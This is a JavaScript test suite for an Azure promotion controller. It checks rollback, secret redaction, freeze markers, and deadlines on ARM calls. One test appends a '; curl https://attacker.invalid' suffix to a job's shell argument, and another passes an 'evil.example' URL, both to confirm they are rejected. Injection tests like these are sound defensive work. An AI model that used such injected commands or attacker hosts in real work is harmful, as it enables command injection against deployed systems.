import test from "node:test";
import assert from "node:assert/strict";
import {
  ArmClient,
  ensureFreezeMarker,
  assertOnlyAllowedDiff,
  hash,
  loadConfig,
  mutableSurface,
  rollbackPromotion,
  runPromotion,
  safeSnapshot,
  secureStateDirectory,
  surface,
  validateTarget
} from "../src/azure-promotion-controller.mjs";
import { chmod, mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

const oldImage = "crpolyedge6urdjr5nmwx7w.azurecr.io/polyedge-rust-research@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const oldGenerator = "crpolyedge6urdjr5nmwx7w.azurecr.io/polyedge-rust-research@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
const candidate = "crpolyedge6urdjr5nmwx7w.azurecr.io/polyedge-rust-research@sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";
const config = { subscriptionId: "11111111-1111-1111-1111-111111111111", image: candidate, clock: () => Date.parse("2026-08-16T00:30:00Z") };
const hourlyArg = "TARGET=$(date -u -d \"1 hour ago\" +%Y/%m/%d/%H); DAY=${TARGET%/*}; HOUR=${TARGET##*/}; OUT=\"reports/research/hourly/$DAY/$HOUR/audit.json\"; /bin/sh /app/research/run_compact_report_job.sh polyedge_hourly_quality \"$OUT\" polyedge-rs research audit --input \"azure://$AZURE_STORAGE_ACCOUNT_NAME/$AZURE_STORAGE_CONTAINER_NAME/events/$DAY/$HOUR/?prefetch_blobs=8\" --out \"$OUT\" --markdown \"reports/research/hourly/$DAY/$HOUR/audit.md\" --exclude-file \"data_quality/exclusion_windows.yaml\"";

function hourlyEnvironment(generatorImage) {
  return [
    ["APP_NAME", "polyedge"], ["EXECUTION_MODE", "paper"], ["ALLOW_LIVE", "false"], ["RUN_BOT_ON_STARTUP", "false"], ["REQUIRE_API_AUTH", "true"],
    ["AZURE_CLIENT_ID", "f76a4a3d-d287-4dfd-b348-19f39fe698a5"], ["AZURE_SUBSCRIPTION_ID", "73783c0c-5a53-4f9b-b244-6f64e813814c"], ["AZURE_RESOURCE_GROUP", "rg-polyedge-dev"],
    ["AZURE_STORAGE_ACCOUNT_NAME", "stpolyedge6urdjr5nmwx7w"], ["AZURE_STORAGE_CONTAINER_NAME", "bot-events"], ["AZURE_STORAGE_TABLE_NAME", "BotEventIndex"], ["AZURE_CHART_TABLE_NAME", "BotChartSeries"], ["AZURE_MARKET_TABLE_NAME", "BotMarketCatalog"],
    ["ENABLE_TAKER_ORDERS", "false"], ["ALLOW_EMERGENCY_ACCOUNT_CANCEL", "false"], ["POLYEDGE_GENERATOR_PLATFORM", "azure_container_apps_job"], ["POLYEDGE_GENERATOR_IMAGE", generatorImage]
  ].map(([name, value]) => ({ name, value })).concat({ name: "API_BEARER_TOKEN", secretRef: "api-bearer-token" });
}

function fixture() {
  const app = {
    location: "eastus", identity: { type: "UserAssigned", userAssignedIdentities: { "/subscriptions/x/resourceGroups/rg-polyedge-dev/providers/Microsoft.ManagedIdentity/userAssignedIdentities/polyedge-dev-id": {} } },
    properties: {
      provisioningState: "Succeeded", latestRevisionName: "revision-1", latestReadyRevisionName: "revision-1",
      configuration: { activeRevisionsMode: "Single", secrets: [{ name: "api-bearer-token", value: "must-never-reach-the-journal" }] },
      template: { containers: [{ name: "bot", image: oldImage, env: [{ name: "EXECUTION_MODE", value: "paper" }, { name: "ALLOW_LIVE", value: "false" }, { name: "ENABLE_TAKER_ORDERS", value: "false" }] }, { name: "frontend", image: "frontend@sha256:ok", env: [] }] }
    }
  };
  const job = {
    location: "eastus", identity: { type: "UserAssigned", userAssignedIdentities: { "/subscriptions/x/resourceGroups/rg-polyedge-dev/providers/Microsoft.ManagedIdentity/userAssignedIdentities/polyedge-dev-id": {} } },
    properties: {
      provisioningState: "Succeeded",
      configuration: { triggerType: "Schedule", replicaTimeout: 1800, replicaRetryLimit: 1, scheduleTriggerConfig: { cronExpression: "10 * * * *", parallelism: 1, replicaCompletionCount: 1 }, secrets: [{ name: "api-bearer-token", value: "must-never-reach-the-journal" }] },
      template: { containers: [{ name: "research-job", image: oldImage, command: ["/bin/sh", "-lc"], args: [hourlyArg], env: hourlyEnvironment(oldGenerator) }] }
    }
  };
  return { app, job };
}

function clone(value) { return structuredClone(value); }

function armFixture({ crashAfterApp = false, proofStatus = null, unsafeProof = false } = {}) {
  const state = fixture();
  let crash = crashAfterApp;
  let execution = null;
  const paths = { app: "/containerApps/polyedge-dev", job: "/jobs/polyedge-hourly-quality-job" };
  return {
    state,
    paths,
    recover() { crash = false; },
    stopped: false,
    async listExecutions() { return []; },
    async get(resourcePath) { return clone(resourcePath.includes("containerApps") ? state.app : state.job); },
    async patch(resourcePath, body) {
      const resource = resourcePath.includes("containerApps") ? state.app : state.job;
      resource.properties.template = clone(body.properties.template);
      if (resourcePath.includes("containerApps") && crash) {
        crash = false;
        throw new Error("simulated process termination after app write");
      }
      return clone(resource);
    },
    setExecution(value) { execution = value; },
    async startJob() {
      execution = { name: "proof-execution", properties: { status: proofStatus ?? "Succeeded", template: clone(state.job.properties.template) } };
      if (unsafeProof) execution.properties.template.containers[0].env.find(({ name }) => name === "ALLOW_LIVE").value = "true";
      return { name: execution.name };
    },
    async getExecution(_resourcePath, name) {
      assert.equal(name, "proof-execution");
      return clone(execution);
    },
    async stopExecution(_resourcePath, name) {
      assert.equal(name, "proof-execution");
      this.stopped = true;
      execution.properties.status = "Stopped";
    }
  };
}

function journalStore() {
  let value = null;
  return {
    async load() { return clone(value); },
    async save(next) { value = clone(next); },
    value: () => clone(value)
  };
}

test("failure after the first write rolls back to the recorded pre-write hash", async () => {
  const arm = armFixture({ crashAfterApp: true });
  const store = journalStore();
  await assert.rejects(runPromotion({ arm, config, ...store }), /simulated process termination/);
  assert.equal(validateTarget(arm.state.app, arm.state.job).appImage, oldImage);
  assert.equal(store.value().phase, "rolled_back");
});

test("promotion waits for both resources and records a successful exact hourly proof", async () => {
  const arm = armFixture();
  const store = journalStore();
  const result = await runPromotion({ arm, config: { ...config, proveExecution: true, proofTimeoutMs: 1_000, clock: () => Date.parse("2026-08-16T00:30:00Z"), sleep: async () => {} }, ...store });
  assert.equal(result.status, "promoted");
  assert.equal(store.value().phase, "promoted");
  assert.equal(store.value().proof.executionName, "proof-execution");
});

test("failed or overdue proofs stop exactly that execution and roll back", async () => {
  for (const proofStatus of ["Failed", "Running"]) {
    const arm = armFixture({ proofStatus });
    const store = journalStore();
    let now = Date.parse("2026-08-16T00:30:00Z");
    const proofTimeoutMs = 1_000;
    await assert.rejects(runPromotion({ arm, config: { ...config, proveExecution: true, proofTimeoutMs, clock: () => now, sleep: async () => { now += proofTimeoutMs; } }, ...store }), /hourly proof/);
    assert.equal(validateTarget(arm.state.app, arm.state.job).appImage, oldImage);
    assert.equal(store.value().phase, "rolled_back");
    assert.equal(arm.stopped, proofStatus === "Running", proofStatus);
  }
});

test("crash after the first write can roll back only controller-owned post-write state", async () => {
  const arm = armFixture({ crashAfterApp: true });
  const store = journalStore();
  await assert.rejects(runPromotion({ arm, config, ...store }));
  arm.recover();
  const result = await rollbackPromotion({ arm, config, journal: store.value(), save: store.save });
  assert.equal(result.status, "rolled_back");
  assert.deepEqual(validateTarget(arm.state.app, arm.state.job), { appImage: oldImage, jobImage: oldImage, generatorImage: oldGenerator });
});

test("unrelated changes and non-target fields fail closed", async () => {
  const arm = armFixture({ crashAfterApp: true });
  const store = journalStore();
  await assert.rejects(runPromotion({ arm, config, ...store }));
  arm.state.app.properties.template.containers[0].image = candidate;
  arm.state.app.properties.configuration.activeRevisionsMode = "Multiple";
  await assert.rejects(rollbackPromotion({ arm, config, journal: store.value(), save: store.save }), /controller-owned post-write state/);

  const { app } = fixture();
  const changed = clone(app);
  changed.properties.template.containers[1].image = "frontend@sha256:changed";
  assert.throws(() => assertOnlyAllowedDiff(app, changed, "app", oldImage), /outside its allowed image fields/);
});

test("journal snapshots redact secret values while preserving a stable full surface", () => {
  const { app, job } = fixture();
  const snapshot = safeSnapshot({ app, job, direct: { name: "UNSAFE_TOKEN", value: "must-never-reach-the-journal" } });
  assert.equal(JSON.stringify(snapshot).includes("must-never-reach-the-journal"), false);
  assert.equal(snapshot.app.properties.configuration.secrets[0].name, "api-bearer-token");
  assert.equal(hash(surface(app)), hash(surface(clone(app))));
  const changed = clone(job);
  changed.properties.template.containers[0].env.push({ name: "DIRECT_TOKEN", value: "changed-secret" });
  assert.notEqual(hash(mutableSurface(job)), hash(mutableSurface(changed)));
});

test("read-only revision drift is ignored but mutable safety drift is not", () => {
  const { app, job } = fixture();
  const platformUpdated = clone(app);
  platformUpdated.properties.latestRevisionName = "revision-2";
  platformUpdated.properties.latestReadyRevisionName = "revision-2";
  assert.equal(hash(surface(app)), hash(surface(platformUpdated)));
  const unsafe = clone(job);
  unsafe.properties.template.containers[0].env.find(({ name }) => name === "ALLOW_LIVE").value = "true";
  assert.throws(() => validateTarget(app, unsafe), /ALLOW_LIVE/);
});

test("ARM 202 operations are polled and never returned as update resources", async () => {
  const originalFetch = globalThis.fetch;
  const replies = [
    new Response(null, { status: 202, headers: { location: "https://management.azure.com/operation/poll" } }),
    new Response(JSON.stringify({ status: "InProgress" }), { status: 200 }),
    new Response(JSON.stringify({ status: "Succeeded" }), { status: 200 }),
    new Response(JSON.stringify({ id: "resource-after-lro", properties: {} }), { status: 200 })
  ];
  globalThis.fetch = async () => replies.shift();
  try {
    const arm = new ArmClient({ getToken: async () => ({ token: "not-logged" }) }, async () => {});
    const result = await arm.patch("/resource", { properties: {} });
    assert.equal(result.id, "resource-after-lro");
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("freeze marker rejects unsafe permissions before any Azure request", async () => {
  const directory = await mkdtemp(path.join(tmpdir(), "polyedge-freeze-"));
  const marker = path.join(directory, "marker");
  await writeFile(marker, "polyedge-azure-promotion-freeze-v1\n", { mode: 0o600 });
  await chmod(marker, 0o644);
  await assert.rejects(ensureFreezeMarker(marker), /root-owned 0600/);
});

function promotionEnvironment(overrides = {}) {
  return {
    AZURE_SUBSCRIPTION_ID: "11111111-1111-1111-1111-111111111111",
    AZURE_TENANT_ID: "22222222-2222-2222-2222-222222222222",
    AZURE_CLIENT_ID: "33333333-3333-3333-3333-333333333333",
    AZURE_FEDERATED_TOKEN_FILE: "/run/polyedge-federated-promotion/azure-federated-token",
    AZURE_TOKEN_CREDENTIALS: "WorkloadIdentityCredential",
    AZURE_RESOURCE_GROUP: "rg-polyedge-dev",
    POLYEDGE_PROMOTION_IMAGE: candidate,
    POLYEDGE_PROMOTION_CANDIDATE_COMMIT: "d".repeat(40),
    POLYEDGE_PROMOTION_CANDIDATE_RUN_ID: "123456",
    POLYEDGE_PROMOTION_STATE_DIR: "/var/lib/polyedge/azure-promotion",
    POLYEDGE_PROMOTION_FREEZE_MARKER: "/etc/polyedge/ENABLE_AZURE_PROMOTION_CONTROLLER",
    POLYEDGE_PROMOTION_PROVE_HOURLY: "true",
    ...overrides
  };
}

function freezeAttestation(overrides = {}) {
  const created = "2026-08-16T00:00:00.000Z";
  const expires = "2026-08-16T01:00:00.000Z";
  return {
    schema: "polyedge.azure_promotion_freeze.v1",
    created_at: created,
    expires_at: expires,
    candidate: { image: candidate, commit: "d".repeat(40), run_id: "123456" },
    workflows: ["deploy-polyedge-active.yml", "deploy-polyedge-research-jobs.yml", "promote-conduit-backend-to-azure.yml"].map((path) => ({ path, disabled: true, active_runs: 0, evidence: { source: "github-api", observed_at: "2026-08-16T00:30:00.000Z" } })),
    ...overrides
  };
}

test("config pins the dedicated workload-identity credential lane", () => {
  assert.equal(loadConfig(promotionEnvironment()).candidateRunId, "123456");
  assert.throws(() => loadConfig(promotionEnvironment({ AZURE_TOKEN_CREDENTIALS: "prod" })), /pin WorkloadIdentityCredential/);
  assert.throws(() => loadConfig(promotionEnvironment({ AZURE_FEDERATED_TOKEN_FILE: "/tmp/token" })), /dedicated promotion-controller lane/);
  assert.throws(() => loadConfig(promotionEnvironment({ POLYEDGE_PROMOTION_STATE_DIR: "/tmp/state" })), /systemd StateDirectory path/);
});

test("freeze marker rejects expiry and an unbound candidate", async () => {
  const directory = await mkdtemp(path.join(tmpdir(), "polyedge-freeze-valid-"));
  const marker = path.join(directory, "marker");
  await writeFile(marker, JSON.stringify(freezeAttestation()), { mode: 0o600 });
  const loaded = loadConfig(promotionEnvironment());
  await ensureFreezeMarker(marker, loaded, Date.parse("2026-08-16T00:45:00Z"), process.getuid());
  await assert.rejects(ensureFreezeMarker(marker, loaded, Date.parse("2026-08-16T02:00:00Z"), process.getuid()), /stale/);
  await assert.rejects(ensureFreezeMarker(marker, { ...loaded, candidateRunId: "999" }, Date.parse("2026-08-16T00:45:00Z"), process.getuid()), /not bound/);
});

test("pagination, LRO URLs, and retry hints are bounded and trusted", async () => {
  const originalFetch = globalThis.fetch;
  globalThis.fetch = async () => new Response(JSON.stringify({ value: [], nextLink: "https://management.azure.com/repeated" }), { status: 200 });
  try {
    const arm = new ArmClient({ getToken: async () => ({ token: "not-logged" }) }, async () => {});
    assert.equal(arm.retryAfter(new Response(null, { status: 202 })), 2_000);
    assert.equal(arm.retryAfter(new Response(null, { status: 202, headers: { "retry-after": "9999" } })), 30_000);
    await assert.rejects(arm.listExecutions("/jobs/test"), /repeated a nextLink/);
    await assert.rejects(arm.waitForOperation("https://evil.example/operation", 0), /untrusted/);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("the hourly schedule edge is refused before either image write", async () => {
  const arm = armFixture();
  const store = journalStore();
  await assert.rejects(runPromotion({ arm, config: { ...config, clock: () => Date.parse("2026-08-16T00:34:00Z") }, ...store }), /start window/);
  assert.equal(validateTarget(arm.state.app, arm.state.job).appImage, oldImage);
});

test("an unsafe proof template is stopped and rolls back", async () => {
  const arm = armFixture({ unsafeProof: true });
  const store = journalStore();
  await assert.rejects(runPromotion({ arm, config: { ...config, proveExecution: true, proofTimeoutMs: 1_000, clock: () => Date.parse("2026-08-16T00:30:00Z"), sleep: async () => {} }, ...store }), /ALLOW_LIVE/);
  assert.equal(arm.stopped, false);
  assert.equal(store.value().phase, "rolled_back");
});

test("a reboot with a recorded running proof stops it and resumes rollback", async () => {
  const arm = armFixture();
  const store = journalStore();
  await runPromotion({ arm, config: { ...config, clock: () => Date.parse("2026-08-16T00:30:00Z") }, ...store });
  const journal = store.value();
  journal.phase = "proof_start_intent";
  journal.proof = { beforeExecutionNames: [], executionName: "proof-execution", deadlineMs: Date.parse("2026-08-16T00:45:00Z") };
  await store.save(journal);
  arm.setExecution({ name: "proof-execution", properties: { status: "Running", template: clone(arm.state.job.properties.template) } });
  const result = await runPromotion({ arm, config, ...store });
  assert.equal(result.status, "rolled_back");
  assert.equal(arm.stopped, true);
  assert.equal(validateTarget(arm.state.app, arm.state.job).appImage, oldImage);
});

test("an interrupted rollback never resumes forward promotion", async () => {
  const arm = armFixture();
  const store = journalStore();
  await runPromotion({ arm, config: { ...config, clock: () => Date.parse("2026-08-16T00:30:00Z") }, ...store });
  const journal = store.value();
  journal.phase = "rollback_app_intent";
  await store.save(journal);
  const result = await runPromotion({ arm, config, ...store });
  assert.equal(result.status, "rolled_back");
  assert.equal(validateTarget(arm.state.app, arm.state.job).appImage, oldImage);
});

test("a SIGKILL journal at every ambiguous forward phase recovers rollback-only", async () => {
  const sourceArm = armFixture();
  const sourceStore = journalStore();
  await runPromotion({ arm: sourceArm, config: { ...config }, ...sourceStore });
  const promoted = sourceStore.value();
  for (const phase of ["app_write_intent", "app_written", "job_write_intent", "proof_start_intent", "proof_succeeded", "proof_stop_intent"]) {
    const arm = armFixture();
    if (phase !== "app_write_intent") arm.state.app = clone(sourceArm.state.app);
    if (["job_write_intent", "proof_start_intent", "proof_succeeded", "proof_stop_intent"].includes(phase)) arm.state.job = clone(sourceArm.state.job);
    const store = journalStore();
    const journal = clone(promoted);
    journal.phase = phase;
    await store.save(journal);
    const result = await runPromotion({ arm, config: { ...config }, ...store });
    assert.equal(result.status, "rolled_back", phase);
    assert.equal(validateTarget(arm.state.app, arm.state.job).appImage, oldImage, phase);
  }
});

test("exact hourly argv rejects a malicious appended shell suffix", () => {
  const { app, job } = fixture();
  job.properties.template.containers[0].args[0] += "; curl https://attacker.invalid";
  assert.throws(() => validateTarget(app, job), /command or argv drifted/);
});

test("freeze evidence rejects stale, future, and forged manifest attestations", async () => {
  const directory = await mkdtemp(path.join(tmpdir(), "polyedge-freeze-evidence-"));
  const marker = path.join(directory, "marker");
  const now = Date.parse("2026-08-16T00:45:00Z");
  const loaded = loadConfig(promotionEnvironment());
  const write = async (value) => writeFile(marker, JSON.stringify(value), { mode: 0o600 });
  const stale = freezeAttestation();
  stale.workflows[0].evidence.observed_at = "2026-08-16T00:20:00.000Z";
  await write(stale);
  await assert.rejects(ensureFreezeMarker(marker, loaded, now, process.getuid()), /lacks live/);
  const future = freezeAttestation();
  future.workflows[0].evidence.observed_at = "2026-08-16T00:50:00.000Z";
  await write(future);
  await assert.rejects(ensureFreezeMarker(marker, loaded, now, process.getuid()), /lacks live/);
  const digest = "e".repeat(64);
  const manifest = freezeAttestation({ workflows: freezeAttestation().workflows.map(({ evidence, ...workflow }) => workflow), verified_manifest: { source: "verified-manifest", sha256: digest, verified_at: "2026-08-16T00:40:00.000Z" } });
  await write(manifest);
  await assert.rejects(ensureFreezeMarker(marker, loaded, now, process.getuid()), /lacks live/);
  const bound = loadConfig(promotionEnvironment({ POLYEDGE_PROMOTION_FREEZE_MANIFEST_SHA256: digest }));
  await ensureFreezeMarker(marker, bound, now, process.getuid());
  manifest.verified_manifest.verified_at = "2026-08-16T00:50:00.000Z";
  await write(manifest);
  await assert.rejects(ensureFreezeMarker(marker, bound, now, process.getuid()), /lacks live/);
});

test("long ARM retry waits and clean StateDirectory bootstrap are bounded", async () => {
  let monotonic = 0;
  const arm = new ArmClient({ getToken: async () => ({ token: "not-logged" }) }, async () => {}, () => monotonic);
  arm.deadlineMonotonicMs = 100;
  await assert.rejects(arm.waitForOperation("https://management.azure.com/operation/poll", 30_000), /would exceed its forward or transaction deadline/);
  const directory = await mkdtemp(path.join(tmpdir(), "polyedge-state-parent-"));
  const stateDirectory = path.join(directory, "polyedge", "azure-promotion");
  await secureStateDirectory(stateDirectory, process.getuid());
  const stat = await (await import("node:fs/promises")).lstat(stateDirectory);
  assert.equal(stat.mode & 0o777, 0o700);
});

test("an unbounded forward LRO preserves the rollback reserve and rollback calls still fit", async () => {
  const originalFetch = globalThis.fetch;
  let monotonic = 0;
  globalThis.fetch = async () => new Response(null, { status: 202 });
  try {
    const arm = new ArmClient({ getToken: async () => ({ token: "not-logged" }) }, async (ms) => { monotonic += ms; }, () => monotonic);
    await assert.rejects(arm.waitForOperation("https://management.azure.com/operation/poll", 30_000), /would exceed its forward or transaction deadline/);
    assert.ok(monotonic <= arm.forwardDeadlineMonotonicMs, "forward LRO crossed its reserved rollback boundary");
    assert.ok(arm.transactionDeadlineMonotonicMs - monotonic >= 600_000, "forward LRO consumed rollback reserve");
    monotonic = arm.forwardDeadlineMonotonicMs;
    arm.setDeadlineMonotonicMs(arm.transactionDeadlineMonotonicMs, "rollback");
    globalThis.fetch = async () => new Response(JSON.stringify({ id: "restored" }), { status: 200 });
    assert.equal((await arm.get("/restorative-resource")).id, "restored");
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("a delayed controller start shares one deadline with real ARM forward and rollback calls", async () => {
  const originalFetch = globalThis.fetch;
  const { app, job } = fixture();
  let monotonic = 0;
  let appWrites = 0;
  let firstArmRequest = false;
  const credential = { getToken: async () => ({ token: "not-logged" }) };
  const arm = new ArmClient(credential, async (ms) => { monotonic += ms; }, () => monotonic);
  globalThis.fetch = async (url, options = {}) => {
    firstArmRequest = true;
    const requestUrl = String(url);
    const method = options.method ?? "GET";
    if (requestUrl.includes("/operation/poll")) return new Response(JSON.stringify({ status: "InProgress" }), { status: 200, headers: { "retry-after": "30" } });
    if (requestUrl.includes("/executions?")) return new Response(JSON.stringify({ value: [] }), { status: 200 });
    const resource = requestUrl.includes("/containerApps/") ? app : job;
    if (method === "PATCH") {
      resource.properties.template = JSON.parse(options.body).properties.template;
      if (resource === app && ++appWrites === 1) return new Response(null, { status: 202, headers: { location: "https://management.azure.com/operation/poll" } });
      return new Response(JSON.stringify({}), { status: 200 });
    }
    return new Response(JSON.stringify(resource), { status: 200 });
  };
  try {
    const store = journalStore();
    monotonic = 50_000; // ArmClient was constructed before the controller transaction began.
    await assert.rejects(runPromotion({ arm, config: { ...config, monotonicNow: () => monotonic }, ...store }), /operation polling would exceed/);
    assert.equal(firstArmRequest, true, "the delayed start must not reject before its first ARM request");
    assert.equal(arm.forwardDeadlineMonotonicMs, 50_000 + 1_620_000);
    assert.ok(arm.transactionDeadlineMonotonicMs - monotonic >= 600_000, "the forward LRO must leave the full rollback reserve");
    assert.equal(appWrites, 2, "rollback must restore the app after the bounded LRO fails");
    assert.equal(validateTarget(app, job).appImage, oldImage);
    assert.equal(store.value().phase, "rolled_back");
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("a never-resolving workload token is bounded by the shared forward deadline", async () => {
  const originalFetch = globalThis.fetch;
  let fetched = false;
  globalThis.fetch = async () => { fetched = true; throw new Error("fetch must not run without a token"); };
  try {
    const now = performance.now();
    const timing = Object.freeze({ forwardDeadlineMonotonicMs: now + 20, transactionDeadlineMonotonicMs: now + 600_025 });
    const arm = new ArmClient({ getToken: () => new Promise(() => {}) }, async () => {}, () => performance.now());
    const store = journalStore();
    await assert.rejects(runPromotion({ arm, config: { ...config, monotonicNow: () => performance.now(), promotionTiming: timing }, ...store }), /token acquisition exceeded its phase deadline/);
    assert.equal(fetched, false);
  } finally {
    globalThis.fetch = originalFetch;
  }
});
